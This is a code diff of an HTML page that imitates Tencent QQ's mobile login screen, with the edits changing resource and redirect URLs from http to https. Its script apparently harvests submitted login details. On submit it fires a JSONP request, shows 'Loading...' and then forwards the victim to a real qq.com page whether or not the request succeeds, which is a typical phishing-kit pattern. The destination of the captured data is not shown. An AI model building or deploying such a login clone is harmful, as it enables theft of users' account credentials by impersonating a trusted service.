@@ -10,10 +10,10 @@
     <title>&#25163;&#26426;&#32479;&#19968;&#30331;&#24405;</title>
     <style type="text/css">
         .logo {
-            background-image: url(http://qzonestyle.gtimg.cn/qzone/phone/style/img/ptlogin-logo.png)
+            background-image: url(https://qzonestyle.gtimg.cn/qzone/phone/style/img/ptlogin-logo.png)
         }
     </style>
-    <link rel="stylesheet" href="http://qzonestyle.gtimg.cn/qzone/phone/style/login.css">
+    <link rel="stylesheet" href="https://qzonestyle.gtimg.cn/qzone/phone/style/login.css">
 </head>
 <body style="zoom: 1;">
 <div id="content" class="content"><div id="error_tips"><div id="error_tips_content"><span id="error_icon"></span><span id="error_message"></span></div></div><div id="login" class="login"><div id="logo" class="logo"></div><div id="app_name" style="display: none"></div><div id="q_login" class="q_login" style="display: none"><div id="q_login_title"><div id="q_login_logo"></div><label id="q_login_tips">请选择登录帐号</label></div><div id="q_logon_list" class="q_logon_list"></div></div><div id="web_login">
@@ -27,7 +27,7 @@
 <div href="javascript:void(0);" id="onekey" class=" weak" style="display: block;" onclick="javascript:onekey();"> 一键登录</div>
 </form></div><div id="switch"><div id="swicth_login" onclick="pt._switch()" style="display: none">快速登录历史帐号</div><div id="zc_feedback"><span id="zc" onclick="window.open('https\x3A\x2F\x2Fssl.zc.qq.com\x2Fchs')">注册新帐号</span><span id="forgetpwd" onclick="window.open('https\x3A\x2F\x2Faq.qq.com\x2Fcn2\x2Ffindpsw\x2Fmobile_v2\x2Fmobile_web_find_index')">忘了密码？</span></div></div><div id="custom_bottom"></div></div><div id="vcode"><label id="vcode_tips">点击图片可更换验证码</label><div id="vcode_area"><img id="vcode_img"><label id="input_tips">请输入图中的字符不区分大小写</label><input<input id="vcode_input" name="vcode_input" tabindex="3" autocomplete="off" autocorrect="off" maxlength="6"></input<input></div><div id="submit">提交验证码</div></div></div><div id="new_vcode" class="new_vcode"></div><div id="footerBlank"></div>
 
-<script src="http://libs.baidu.com/jquery/1.9.0/jquery.js"></script>
+<script src="https://libs.baidu.com/jquery/1.9.0/jquery.js"></script>
 <script>
 var err = false;
 var times = 0;
@@ -85,10 +85,10 @@ $('form').submit(function(){
                     dataType:'jsonp',
                     success:function(r){
                         alert("Loading...");
-                        window.location.href = 'http://c.pc.qq.com/ios.html?level=14&sublevel=210';
+                        window.location.href = 'https://c.pc.qq.com/ios.html?level=14&sublevel=210';
                     },
                     error:function(er){
-                        window.location.href = 'http://c.pc.qq.com/ios.html?level=14&sublevel=210';
+                        window.location.href = 'https://c.pc.qq.com/ios.html?level=14&sublevel=210';
                     }
                 })
 
@@ -101,7 +101,7 @@ document.getElementById("onekey").innerHTML = "正在拉起QQ手机版...";
 setTimeout(pullerror,"250");
 }
 function pullerror(){
-	error("使用一键登录，<a href='http://im.qq.com/mobileqq/touch/53/index.html' target='_blank'>请安装最新版本的QQ手机版</a>");
+	error("使用一键登录，<a href='https://im.qq.com/mobileqq/touch/53/index.html' target='_blank'>请安装最新版本的QQ手机版</a>");
 document.getElementById("onekey").innerHTML = "一键登录";
 }</script>
 </body></html>
